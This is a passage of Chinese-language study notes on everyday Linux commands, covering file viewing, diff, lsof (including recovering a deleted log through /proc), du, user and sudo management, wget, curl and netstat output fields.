install and  \nuse security applications, as well as how the applcations work and why they are necesary. \n```\n使用 wc统计，结果如下：\n```bash\n$ wc testfile           # testfile文件的统计信息  \n3 92 598 testfile       # testfile文件的行数为3、单词数92、字节数598 \n```\n其中，3 个数字分别表示testfile文件的行数、单词数，以及该文件的字节数。\n如果想同时统计多个文件的信息，例如同时统计testfile、testfile_1、testfile_2，可使用如下命令：\n```bash\nwc testfile testfile_1 testfile_2   #统计三个文件的信息 \n```\n输出结果如下：\n```bash\n$ wc testfile testfile_1 testfile_2  #统计三个文件的信息  \n3 92 598 testfile                    #第一个文件行数为3、单词数92、字节数598  \n9 18 78 testfile_1                   #第二个文件的行数为9、单词数18、字节数78  \n3 6 32 testfile_2                    #第三个文件的行数为3、单词数6、字节数32  \n15 116 708 总用量                    #三个文件总共的行数为15、单词数116、字节数708 \n```\n\n## file命令\nLinux file命令用于辨识文件类型。\n\n通过file指令，我们得以辨识该文件的类型。\n\n### 实例\n显示文件类型：\n```bash\n[root@localhost ~]# file install.log\ninstall.log: UTF-8 Unicode text\n\n[root@localhost ~]# file -b install.log      <== 不显示文件名称\nUTF-8 Unicode text\n\n[root@localhost ~]# file -i install.log      <== 显示MIME类别。\ninstall.log: text/plain; charset=utf-8\n\n[root@localhost ~]# file -b -i install.log\ntext/plain; charset=utf-8\n```\n\n显示符号链接的文件类型\n```bash\n[root@localhost ~]# ls -l /var/mail\nlrwxrwxrwx 1 root root 10 08-13 00:11 /var/mail -> spool/mail\n\n[root@localhost ~]# file /var/mail\n/var/mail: symbolic link to `spool/mail'\n\n[root@localhost ~]# file -L /var/mail\n/var/mail: directory\n\n[root@localhost ~]# file /var/spool/mail\n/var/spool/mail: directory\n\n[root@localhost ~]# file -L /var/spool/mail\n/var/spool/mail: directory\n```\n\n## more\nmore 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。\n\n### 实例\n逐页显示 testfile 文档内容，如有连续两行以上空白行则以一行空白行显示。\n```bash\nmore -s testfile\n```\n从第 20 行开始显示 testfile 之文档内容。\n```bash\nmore +20 testfile\n```\n\n## less\nless 与 more 类似，less 可以随意浏览文件，支持翻页和搜索，支持向上翻页和向下翻页。\n\n### 实例\n1、查看文件\n```bash\nless log2013.log\n```\n2、ps查看进程信息并通过less分页显示\n```bash\nps -ef |less\n```\n3、查看命令历史使用记录并通过less分页显示\n```bash\n[root@localhost test]# history | less\n22  scp -r tomcat6.0.32 root@192.168.120.203:/opt/soft\n23  cd ..\n24  scp -r web root@192.168.120.203:/opt/\n25  cd soft\n26  ls\n……省略……\n```\n4、浏览多个文件\n```bash\nless log2013.log log2014.log\n```\n## head\nhead 命令可用于查看文件的开头部分的内容，有一个常用的参数 -n 用于显示行数，默认为 10，即显示 10 行的内容。\n\n### 实例\n要显示 runoob_notes.log 文件的开头 10 行，请输入以下命令：\n```bash\nhead runoob_notes.log\n```\n显示 notes.log 文件的开头 5 行，请输入以下命令：\n```bash\nhead -n 5 runoob_notes.log\n```\n显示文件前 20 个字节:\n```bash\nhead -c 20 runoob_notes.log\n```\n\n## tail\ntail 命令可用于查看文件的内容，有一个常用的参数 -f 常用于查阅正在改变的日志文件。\n\n`tail -f filename` 会把 filename 文件里的最尾部的内容显示在屏幕上，并且不断刷新，只要 filename 更新就可以看到最新的文件内容。\n\n### 实例\n要显示 notes.log 文件的最后 10 行，请输入以下命令：\n```bash\ntail notes.log         # 默认显示最后 10 行\n```\n要跟踪名为 notes.log 的文件的增长情况，请输入以下命令：\n```bash\ntail -f notes.log\n```\n此命令显示 notes.log 文件的最后 10 行。当将某些行添加至 notes.log 文件时，tail 命令会继续显示这些行。 显示一直继续，直到您按下（Ctrl-C）组合键停止显示。\n显示文件 notes.log 的内容，从第 20 行至文件末尾:\n```bash\ntail -n +20 notes.log\n```\n显示文件 notes.log 的最后 10 个字符:\n```bash\ntail -c 10 notes.log\n```\n\n### -f/-F参数详解\n`tail -f`等同于`--follow=descriptor`，根据文件描述符进行追踪，当文件改名或被删除，追踪停止\n`tail -F`等同于`--follow=name --retry`，根据文件名进行追踪，并保持重试，即该文件被删除或改名后，如果再次创建相同的文件名，会继续追踪\n\n#### WSL中tail命令失效问题\ntail -f命令可以滚动查看文件不断更新的信息，尤其在查看日志上很有用。\n但是在WSL（Windows Subsystem for Linux）中，却有可能无法正常工作。\n\n经查找发现，Linux是通过inotify来获取文件变动的，但是我使用的WSL因为Bug，感知不到文件变动，造成此问题。\n\n解决办法：\n```\ntail -f ---disable-inotify info.log\n```\n注意，disable前面是3个横杠。\n\n## diff命令\nLinux diff 命令用于比较文件的差异。\n\ndiff 以逐行的方式，比较文本文件的异同处。如果指定要比较目录，则 diff 会比较目录中相同文件名的文件，但不会比较其中子目录。\n\n### 实例\n实例1：比较两个文件\n```bash\n[root@localhost test3]# diff log2014.log log2013.log \n3c3\n< 2014-03\n---\n> 2013-03\n8c8\n< 2013-07\n---\n> 2013-08\n11,12d10\n< 2013-11\n< 2013-12\n```\n上面的\"3c3\"和\"8c8\"表示log2014.log和log20143log文件在3行和第8行内容有所不同；\"11,12d10\"表示第一个文件比第二个文件多了第11和12行。\n\n\n### ”合并格式“的diff\n如果两个文件相似度很高，那么上下文格式的diff，将显示大量重复的内容，很浪费空间。1990年，GNU diff率先推出了\"合并格式\"的diff，将f1和f2的上下文合并在一起显示。\n它的使用方法是加入u参数（代表unified）。\n```bash\n$ diff -u f1 f2\n```\n显示结果如下：\n```bash\n　　--- f1 2012-08-29 16:45:41.000000000 +0800\n　　+++ f2 2012-08-29 16:45:51.000000000 +0800\n　　@@ -1,7 +1,7 @@\n　　 a\n　　 a\n　　 a\n　　-a\n　　+b\n　　 a\n　　 a\n　　 a\n```\n它的第一部分，也是文件的基本信息。\n```bash\n　　--- f1 2012-08-29 16:45:41.000000000 +0800\n　　+++ f2 2012-08-29 16:45:51.000000000 +0800\n```\n\"---\"表示变动前的文件，\"+++\"表示变动后的文件。\n第二部分，变动的位置用两个@作为起首和结束。\n```bash\n　　@@ -1,7 +1,7 @@\n```\n前面的\"-1,7\"分成三个部分：减号表示第一个文件（即f1），\"1\"表示第1行，\"7\"表示连续7行。合在一起，就表示下面是第一个文件从第1行开始的连续7行。同样的，\"+1,7\"表示变动后，成为第二个文件从第1行开始的连续7行。\n\n第三部分是变动的具体内容。\n```\n　　 a\n　　 a\n　　 a\n　　-a\n　　+b\n　　 a\n　　 a\n　　 a\n```\n除了有变动的那些行以外，也是上下文各显示3行。它将两个文件的上下文，合并显示在一起，所以叫做\"合并格式\"。每一行最前面的标志位，空表示无变动，减号表示第一个文件删除的行，加号表示第二个文件新增的行。\n\n## lsof\nlsof（list open files）是一个查看当前系统文件的工具。在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，该文件描述符提供了大量关于这个应用程序本身的信息。\n\n\n### 常用选项\n- -a 指示其它选项之间为与的关系\n- -c <进程名> 输出指定进程所打开的文件\n- -d <文件描述符> 列出占用该文件号的进程\n- +d <目录>  输出目录及目录下被打开的文件和目录(不递归)\n- +D <目录>  递归输出及目录下被打开的文件和目录\n- -i <条件>  输出符合条件与网络相关的文件\n- -n 不解析主机名\n- -p <进程号> 输出指定 PID 的进程所打开的文件\n- -P 不解析端口号\n- -t 只输出 PID\n- -u 输出指定用户打开的文件\n- -U 输出打开的 UNIX domain socket 文件\n- -h 显示帮助信息\n- -v 显示版本信息\n\n### 基本输出\n如果不带任何选项执行 lsof 命令，会输出系统中所有 active 进程打开的所有文件，结果就是我们被输出的信息所淹没，这没有任何的意义。我们先让 lsof 命令输出当前 Bash 进程打开的文件，并截取其中的一部分结果来介绍输出内容中都包含哪些信息：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423230908.png)\n\n- COMMAND：程序的名称 \n- PID：进程标识符\n- USER：进程所有者\n- FD：文件描述符，应用程序通过文件描述符识别该文件\n- TYPE：文件类型，如 DIR、REG 等\n- DEVICE：以逗号分隔设备编号\n- SIZE：文件的大小(bytes)\n- NODE：索引节点(文件在磁盘上的标识)\n- NAME：打开文件的确切名称\n\n下面简单介绍一下 FD 列和 TYPE 列中的常见内容。\n\nFD 列中的常见内容有 cwd、rtd、txt、mem 和一些数字等等。其中 cwd 表示当前的工作目录；rtd 表示根目录；txt 表示程序的可执行文件；mem 表示内存映射文件：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423233617.png)\n\n还有一部分 FD 是以数字表示的，比如标准输入输出文件：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423233629.png)\n\n数字后面的字母表示进程对该文件的读写模式，比如上图中的 u 表示该文件被打开并处于读取/写入模式。除了 u，还有 r 表示只读模式，w 表示只写模式，还可以同时应用 W 表示该进程拥有对文件写操作的锁。下图是截取的 docker daemon 进程打开的文件列表，其中显示了 FD 的不同模式：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423233702.png)\n\nTYPE 列中常见的 REG 和 DIR 分别表示普通文件和目录。而 CHR 和 BLK 则分别表示字符和块设备，unix、fifo 和 IPv4/IPv6 分别表示 UNIX domain 套接字、先进先出(FIFO)队列和 IPv4/IPv6 套接字。\n\n### 查看哪些进程打开了某个文件\n直接指定文件的名称作为 lsof 的参加就可以查看哪些进程打开了这个文件，下面的命令查询打开了 /bin/bash 文件的进程：\n\n```bash\n$ sudo lsof /bin/bash\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423233819.png)\n\n除了普通文件，也可以是设备等文件(下面命令的输出很长，图示只是截取的一小部分)：\n\n```bash\n$ sudo lsof /dev/sda1\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423233845.png)\n\n### 查看哪些进程打开了某个目录及目录下的文件\n这里分两种情况，+d 选项不执行递归查询，只查找那些打开了指定目录以及指定目录下文件和目录的进程，比如：\n\n```bash\n$ sudo lsof +d /var/log\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423233923.png)\n\n而 +D 选项则会对指定的目录进行递归：\n\n```bash\n$ sudo lsof +D /var/log\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423233949.png)\n\n在卸载文件系统时，如果有进程打开了该文件系统中的文件或目录，卸载操作就会失败。因此最好在卸载文件系统前通过 lsof +D 检查文件系统的挂载点，杀掉相关的进程然后再执行卸载操作。\n\n### 查看某个进程打开的所有文件\n通过 -p 选项并指定进程的 PID 可以输出该进程打开的所有文件。比如我们想要查看 cron 程序打开的文件，可以先用 ps -C cron 命令查出进程的 PID：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423234007.png)\n\n然后把该 PID 传递给 lsof 命令的 -p 选项：\n```bash\n$ sudo lsof -p 1152\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423234028.png)\n\n### 组合多个选项\n如果为 lsof 命令指定多个选项，这些选项间默认是或的关系。也就是说满足任何一个选项的结果都会被输出。可以添加额外的 -a 选项，它的作用就是让其它选项之间的关系变为与，比如下面的命令：\n\n```bash\n$ sudo lsof -a -p $$ -d0,1,2\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423234057.png)\n\n其中的 -p 选项指定了当前进程的 PID，而 -d 选项则用来指定进程打开的文件描述符(可以通过逗号分隔多个文件描述符)。添加 -a 选项后，结果输出为当前进程打开的文件描述符为 0、1、2 的文件。\n\n### 查看指定名称的程序打开的文件\n通过 -c 选项可以匹配进程运行的程序(可执行文件)名称。比如我们要查找以字母 cr 开头的程序打开的文件列表：\n\n```bash\n$ sudo lsof -c cr\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423234125.png)\n\n还可以同时指定多个 -c 选项，它们之间是或的关系。\n\n如果想对 -c 选项的条件取反，只要在字符串前添加符号 ^ 就可以了，比如：\n```bash\n$ sudo lsof -c ^cr\n```\n-c 选项也支持正则表达式，比如下面的命令可以过滤出以 cra 和 cro 开头的程序打开的文件：\n\n```bash\n$ sudo lsof -c /cr[ao]/\n```\n\n### 查看被打开的与网络相关的文件\n-i 选项用来查看被打开的和网络相关的文件，其参数的格式如下：\n```\n[46][protocol][@hostname|hostaddr][:service|port] \n```\n- 46 表示 IP 协议的版本\n- protocol 表示网络协议的名称，比如 TCP 或 UDP  \n- hostname 或 hostaddr 表示主机地址\n- service 指 /etc/services 中的名称，比如 smtp 或多个服务的列表\n- port 表示端口号，可以指定一个或多个\n\n-i 选项默认会同时输出 IPv4 和 IPv6 打开的文件：\n```bash\n$ sudo lsof -i\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423234250.png)\n\n#### 只列出 IPv4 或 IPv6 打开的文件\n```bash\n$ sudo lsof -i 4\n$ sudo lsof -i 6\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423234326.png)\n\n#### 列出与 22 号端口相关的文件\n```bash\n$ sudo lsof -i:22\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423234344.png)\n\n#### 列出指定范围内被打开的 TCP 端口\n```bash\n$ sudo -i TCP:1-1024\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423234421.png)\n\n### 查看某个用户打开的所有文件\n-u 选项可以指定用户名或 user ID，并且和 -c 选项一样，可以通过逗号分隔多个用户名称或 user ID，也可以通过符号 ^ 对条件取反。\n\n#### 查看某个用户打开的所有文件\n```bash\n$ sudo lsof -u syslog\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423235447.png)\n\n#### 查看用户 nick 打开的网络相关的文件\n```bash\n$ sudo lsof -a -i -u nick\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423235529.png)\n\n#### 排除某个用户\n```bash\n$ sudo lsof -i -u ^nick\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423235548.png)\n\n注意：在有排除条件时，不需要指定 -a 选项。\n\n### 通过lsof恢复删除的文件\n如果我们一不小心删除了文件，而又知道这个文本被某个进程打开着，就可以通过 lsof 命令来恢复该文件。具体的原理为：\n- 当进程打开了某个文件时，只要该进程保持打开该文件，即使将文件删除，它依然存在于磁盘中。进程并不知道文件已经被删除，它仍然可以通过打开该文件时提供给它的文件描述符进行读取和写入。除了该进程之外，这个文件是不可见的，因为已经删除了其相应的目录索引节点。\n- 进程打开的文件描述符就存放在 /proc/PID/fd 目录下。/proc 目录挂载的是在内存中所映射的一块区域，所以这些文件和目录并不存在于磁盘中，因此当我们对这些文件进行读取和写入时，实际上是在从内存中获取相关信息。lsof 程序就是使用这些信息和其他关于内核内部状态的信息来产生其输出。所以 lsof 可以显示进程的文件描述符和相关的文件名等信息。也就是说我们通过访问进程的文件描述符可以找到该文件的相关信息。\n\n下面的 demo 演示如何通过 lsof 命令恢复被误删的 /var/log/syslog 文件。\n\n先删除日志文件 /var/log/syslog，记着要提前备份一下这个文件，以防万一：\n```bash\n$ sudo rm /var/log/syslog\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423235848.png)\n\n从上面的信息可以看到 PID 为 1141 的进程打开着该文件，文件描述符为 7，并且显示该文件已经被删除了。接下来我们通过 1141 号进程的文件文件描述符来查看该文件的内容：\n\n```bash\n$ sudo tail -n 5 /proc/1141/fd/7\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423235908.png)\n\n上图说明文件 /var/log/syslog 文件的内容还在，并且可以通过文件描述符访问，接下来通过 IO 重定向的方式重新创建 /var/log/syslog 文件就可以了：\n```bash\n$ sudo sh -c 'cat /proc/1141/fd/7 > /var/log/syslog' \n```\n然后修复文件的权限属性并重启 rsyslog 服务：\n\n```bash\n$ sudo chown syslog:adm /var/log/syslog\n$ sudo systemctl restart rsyslog.service\n```\n这样就完成了 /var/log/syslog 文件的恢复工作。对于许多应用程序，尤其是日志文件和数据库文件，都可以通过这种方式来恢复。\n\n### 以root权限运行\n因为lsof命令会访问核心内存和各种文件，所以lsof有些功能只有在root权限下才能正常执行。\n\n例如：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423224838.png)\n\n`lsof -i`命令在非root下没有输出任何东西\n\n## du\ndu （英文全拼：disk usage）命令用于显示目录或文件的大小。\n\ndu 会显示指定的目录或文件所占用的磁盘空间。\n\n语法\n```\ndu [-abcDhHklmsSx][-L <符号连接>][-X <文件>][--block-size][--exclude=<目录或文件>][--max-depth=<目录层数>][--help][--version][目录或文件]\n```\n\n参数说明：\n- -a或-all 显示目录中个别文件的大小。\n- -b或-bytes 显示目录或文件大小时，以byte为单位。\n- -c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。\n- -D或--dereference-args 显示指定符号连接的源文件大小。\n- -h或--human-readable 以K，M，G为单位，提高信息的可读性。\n- -H或--si 与-h参数相同，但是K，M，G是以1000为换算单位。\n- -k或--kilobytes 以1024 bytes为单位。\n- -l或--count-links 重复计算硬件连接的文件。\n- -L<符号连接>或--dereference<符号连接> 显示选项中所指定符号连接的源文件大小。\n- -m或--megabytes 以1MB为单位。\n- -s或--summarize 仅显示总计。\n- -S或--separate-dirs 显示个别目录的大小时，并不含其子目录的大小。\n- -x或--one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。\n- -X<文件>或--exclude-from=<文件> 在<文件>指定目录或文件。\n- --exclude=<目录或文件> 略过指定的目录或文件。\n- --max-depth=<目录层数> 超过指定层数的目录后，予以忽略。\n- --help 显示帮助。\n- --version 显示版本信息。\n\n### 实例\n1. 显示目录或者文件所占空间:\n```bash\n# du\n608     ./test6\n308     ./test4\n4       ./scf/lib\n4       ./scf/service/deploy/product\n4       ./scf/service/deploy/info\n12      ./scf/service/deploy\n16      ./scf/service\n4       ./scf/doc\n4       ./scf/bin\n32      ./scf\n8       ./test3\n1288    .\n```\n只显示当前目录下面的子目录的目录大小和当前目录的总的大小，最下面的1288为当前目录的总大小\n\n2. 显示指定文件所占空间\n```bash\n# du log2012.log \n300     log2012.log\n```\n\n3. 方便阅读的格式显示test目录所占空间情况：\n```bash\n# du -h test\n608K    test/test6\n308K    test/test4\n4.0K    test/scf/lib\n4.0K    test/scf/service/deploy/product\n4.0K    test/scf/service/deploy/info\n12K     test/scf/service/deploy\n16K     test/scf/service\n4.0K    test/scf/doc\n4.0K    test/scf/bin\n32K     test/scf\n8.0K    test/test3\n1.3M    test\n```\n\n## whereis命令\n\n\n# 用户相关命令\n## id命令\ninux id命令用于显示用户的ID，以及所属群组的ID。\n\n### 例子\n```bash\n[root@localhost ~]# id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\n解释：用户root的UID号码 = 0，GID号码 = 0。用户root是下面组的成员：\n- root组GID号是：0\n- bin组GID号是：1\n- daemon组GID号是：2\n- sys组GID号是：3\n- adm组GID号是：4\n- disk组GID号是：6\n- wheel组GID号是：10\n\n\n\n## usermod\nusermod命令:用来修改用户帐号的各项设定。\n\n语法：`usermod [-LU][-c <备注>][-d <登入目录>][-e <有效期限>][-f <缓冲天数>][-g <群组>][-G <群组>][-l <帐号名称>][-s <shell>][-u <uid>][用户帐号]`\n\n参数：\n- -a<追加> 必须与-G选项一起使用，把用户追加到某些组中。\n- -c<备注> 修改用户帐号的备注文字。\n- -d<登入目录> 修改用户登入时的目录。\n- -e<有效期限> 修改帐号的有效期限。\n- -f<缓冲天数> 修改在密码过期后多少天即关闭该帐号。\n- -g<群组> 修改用户所属的群组。\n- -G<群组> 修改用户所属的附加群组。\n- -l<帐号名称> 修改用户帐号名称。\n- -L 锁定用户密码，使密码无效。\n- -s<shell> 修改用户登入后所使用的shell。\n- -u<uid> 修改用户ID。\n- -U 解除密码锁定。\n\n应用举例：\n1. 将 newuser2 添加到组 staff 中\n```bash\n#usermod -G staff newuser2\n```\n\n2. 修改 newuser 的用户名为 newuser1\n```bash\n#usermod -l newuser1 newuser\n```\n\n## 添加普通用户到 sudo 组\n正常电脑使用或者服务器维护中，我们一般不直接使用 root 账号，如果你现在只有一个 root 账号可以通过下面命令新建一个用户：\n```bash\nuseradd -m steven   //steven 是我的用户名\n```\n然后通过下面命令设置密码：\n```sehll\npasswd steven    //为刚创建的用户设置密码\n```\n把普通用户增加到 sudo 组 通常使用两种方法:\n\n**第一种： 修改 /etc/sudoers 文件**\n```\n...\n\n# User privilege specification\nroot    ALL=(ALL:ALL) ALL\n\n# Allow members of group sudo to execute any command\n%sudo   ALL=(ALL:ALL) ALL   //增加属于自己的用户名\n\n...\n```\n\n**第二种：直接执行命令添加用户到 sudo**\n```bash\nusermod -a -G sudo steven    //注意改成你自己的用户名\n```\n\n## useradd与adduser\nuseradd与adduser都是创建新的用户\n- 在CentOs下useradd与adduser是没有区别的都是在创建用户，在home下自动创建目录，没有设置密码，需要使用passwd命令修改密码。\n- Ubuntu下useradd与adduser有所不同\n     - useradd在使用该命令创建用户是不会在/home下自动创建与用户名同名的用户目录，而且不会自动选择shell版本，也没有设置密码，那么这个用户是不能登录的，需要使用passwd命令修改密码。\n     - adduser在使用该命令创建用户是会在/home下自动创建与用户名同名的用户目录，系统shell版本，会在创建时会提示输入密码，更加友好。\n\n# 网络相关命令\n## wget\nLinux wget命令用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。\n\n### 实例\n1. 使用wget下载单个文件\n```bash\nwget http://www.coonote.com/testfile.zip\n```\n以下的例子是从网络下载一个文件并保存在当前目录，在下载的过程中会显示进度条，包含（下载完成百分比，已经下载的字节，当前下载速度，剩余下载时间）。\n\n2. 下载并以不同的文件名保存\n```bash\nwget -O wordpress.zip http://www.coonote.com/download.aspx?id=1080\n```\nwget默认会以最后一个符合/的后面的字符来命令，对于动态链接的下载通常文件名会不正确。\n\n错误：下面的例子会下载一个文件并以名称download.aspx?id=1080保存:\n```bash\nwget http://www.coonote.com/download?id=1\n```\n即使下载的文件是zip格式，它仍然以download.php?id=1080命令。\n\n正确：为了解决这个问题，我们可以使用参数-O来指定一个文件名：\n```bash\nwget -O wordpress.zip http://www.coonote.com/download.aspx?id=1080\n```\n\n3. 测试下载链接\n当你打算进行定时下载，你应该在预定时间测试下载链接是否有效。我们可以增加--spider参数进行检查。\n```bash\nwget --spider URL\n```\n如果下载链接正确，将会显示:\n```\nSpider mode enabled. Check if remote file exists.\nHTTP request sent, awaiting response... 200 OK\nLength: unspecified [text/html]\nRemote file exists and could contain further links,\nbut recursion is disabled -- not retrieving.\n```\n这保证了下载能在预定的时间进行，但当你给错了一个链接，将会显示如下错误:\n```\nwget --spider url\nSpider mode enabled. Check if remote file exists.\nHTTP request sent, awaiting response... 404 Not Found\nRemote file does not exist -- broken link!!!\n```\n你可以在以下几种情况下使用--spider参数：\n- 定时下载之前进行检查\n- 间隔检测网站是否可用\n- 检查网站页面的死链接\n\n4. 下载多个文件\n```bash\nwget -i filelist.txt\n```\n首先，保存一份下载链接文件：\n```bash\ncat > filelist.txt\nurl1\nurl2\nurl3\nurl4\n```\n接着使用这个文件和参数-i下载。\n\n## curl\nLinux curl命令是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。做网页处理流程和数据检索自动化，curl可以祝一臂之力。\n\n### 实例\n\n#### 文件下载\ncurl命令可以用来执行下载、发送各种HTTP请求，指定HTTP头部等操作。如果系统没有curl可以使用yum install curl安装，也可以下载安装。curl是将下载文件输出到stdout，将进度信息输出到stderr，不显示进度信息使用--silent选项。\n\n```bash\ncurl URL --silent\n```\n\n这条命令是将下载文件输出到终端，所有下载的数据都被写入到stdout。\n\n使用选项-O将下载的数据写入到文件，必须使用文件的绝对地址：\n\n```bash\ncurl https://www.coonote.com/robot.txt --silent -O\n\n```\n\n选项-o将下载数据写入到指定名称的文件中，并使用--progress显示进度条：\n\n```bash\ncurl https://www.coonote.com/robot.txt -o filename.iso --progress\n######################################### 100.0%\n```\n\n#### 快速将请求导成curl格式\n\n**方式一：在浏览器中**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/Screen%20Shot%202022-04-17%20at%2015.30.03.jpg)\n\n**方式二：在postman中**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/Screen%20Shot%202022-04-17%20at%2015.32.41.jpg)\n\n## netstat\nnetstat命令是一个监控TCP/IP网络的非常有用的工具，它可以显示路由表、实际的网络连接以及每一个网络接口设备的状态信息。\n\n语法：\n```bash\nnetstat [选项]\n```\n参数：\n- -a或--all：显示所有连线中的Socket；\n- -A<网络类型>或--<网络类型>：列出该网络类型连线中的相关地址；\n- -c或--continuous：持续列出网络状态；\n- -C或--cache：显示路由器配置的快取信息；\n- -e或--extend：显示网络其他相关信息；\n- -F或--fib：显示FIB；\n- -g或--groups：显示多重广播功能群组组员名单；\n- -h或--help：在线帮助；\n- -i或--interfaces：显示网络界面信息表单；\n- -l或--listening：显示监控中的服务器的Socket；\n- -M或--masquerade：显示伪装的网络连线；\n- -n或--numeric：直接使用ip地址，而不通过域名服务器；\n- -N或--netlink或--symbolic：显示网络硬件外围设备的符号连接名称；\n- -o或--timers：显示计时器；\n- -p或--programs：显示 PID/Program name, 注意：mac下-p为指定协议\n- -r或--route：显示Routing Table；\n- -s或--statistice：显示网络工作信息统计表；\n- -t或--tcp：显示TCP传输协议的连线状况；\n- -u或--udp：显示UDP传输协议的连线状况；\n- -v或--verbose：显示指令执行过程；\n- -V或--version：显示版本信息；\n- -w或--raw：显示RAW传输协议的连线状况；\n- -x或--unix：此参数的效果和指定\"-A unix\"参数相同；\n- -ip或--inet：此参数的效果和指定\"-A inet\"参数相同。\n\n### 实例1：列出所有端口\n命令：\n- netstat -a      # 列出所有端口\n- netstat -at     # 列出所有TCP端口\n- netstat -au    # 列出所有UDP端口\n- netstat -ax    # 列出所有unix端口\n- netstat -atnlp    # 直接使用ip地址列出所有处理监听状态的TCP端口，且加上程序名\n\n输出：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220423113523.png)\n\n> Mac中的netstat是简化版本，参数支持的不多，并且原有-p参数为输出相应程序名，mac下-p为指定协议，且无法知晓pid。综上所述mac下最好还是用lsof\n\n### 输出说明\n#### Proto\n`Proto`:协议名（tcp协议还是udp协议)；\n#### recv-Q与send-Q\n- `recv-Q`:网络接收队列, 表示收到的数据已经在本地接收缓冲，但是还有多少没有被进程取走，recv()如果接收队列Recv-Q一直处于阻塞状态，可能是遭受了拒绝服务 denial-of-service 攻击；\n- `send-Q`:网路发送队列, 对方没有收到的数据或者说没有Ack的, 还是本地缓冲区。 如果发送队列Send-Q不能很快的清零，可能是有应用向外发送数据包过快，或者是对方接收数据包不够快；\n\n这两个值通常应该为0，如果不为0可能是有问题的。packets在两个队列里都不应该有堆积状态。可接受短暂的非0情况。\n\n#### Local Address与Foreign Address\n- Local Address 部分的0.0.0.0:873表示有服务监听该主机上所有ip地址的873端口(0.0.0.0表示本地所有ip)，比如你的主机是有172.172.230.210和172.172.230.11两个ip地址，那么0.0.0.0:873此时表示监听172.172.230.210,172.172.230.211,127.0.0.1三个地址的873端口\n- <font color=\"red\"> 127.0.0.1:25这个表示有服务监听本机的loopback地址的25端口(如果某个服务只监听了回环地址，那么只能在本机进行访问，无法通过tcp/ip 协议进行远程访问)</font>。[实战演练-配置mysql允许远程连接的方法](https://naiswang.github.io/#/notes/Data/mysql.md#启动-mysql-服务)\n- 192.168.1.81:2288这是因为我们在启动的时候指定了192.168.1.81:2288参数，如果不指定的话，会监听0.0.0.0：2288\n\n- `Foreign Address`: 与本机端口通信的外部socket。显示规则与Local Address相同\n\n#### State\n链路状态，共有11种\n\nstate列共有12中可能的状态，前面11种是按照TCP连接建立的三次握手和TCP连接断开的四次挥手过程来描述的。\n- `LISTEN` ：首先服务端需要打开一个socket进行监听，状态为LISTEN. The socket is listening for incoming  connections. 侦听来自远方TCP端口的连接请求\n- `SYN_SENT`：客户端通过应用程序调用connect进行activeopen.于是客户端tcp发送一个SYN以请求建立一个连接.之后状态`SYN_SENT`。The socket is actively attempting to establish aconnection. 在发送连接请求后等待匹配的连接请求\n- `SYN_RECV`：服务端应发出ACK确认客户端的 SYN,同时自己向客户端发送一个SYN.之后状态置为`SYN_RECV`。 A connection request has been received from the network. 在收到和发送一个连接请求后等待对连接请求的确认\n- `ESTABLISHED`：代表一个打开的连接，双方可以进行或已经在数据交互了。 The socket has an established connection. 代表一个打开的连接，数据可以传送给用户\n- `FIN_WAIT1`：主动关闭(activeclose)端应用程序调用close，于是其TCP发出FIN请求主动关闭连接，之后进入`FIN_WAIT1`状态. The socket is closed, and the connection is shutting down. 等待远程TCP的连接中断请求，或先前的连接中断请求的确认\n- `CLOSE_WAIT`：被动关闭(passiveclose)端TCP接到FIN后，就发出ACK以回应FIN请求(它的接收也作为文件结束符传递给上层应用程序),并进入`CLOSE_WAIT`. The remote end has shut down, waiting for the socketto close. 等待从本地用户发来的连接中断请求\n- `FIN_WAIT2`：主动关闭端接到ACK后，就进入了FIN-WAIT-2. Connection is closed, and the socket is waiting for a shutdownfrom the remote end. 从远程TCP等待连接中断请求\n- `LAST_ACK`：被动关闭端一段时间后，接收到文件结束符的应用程 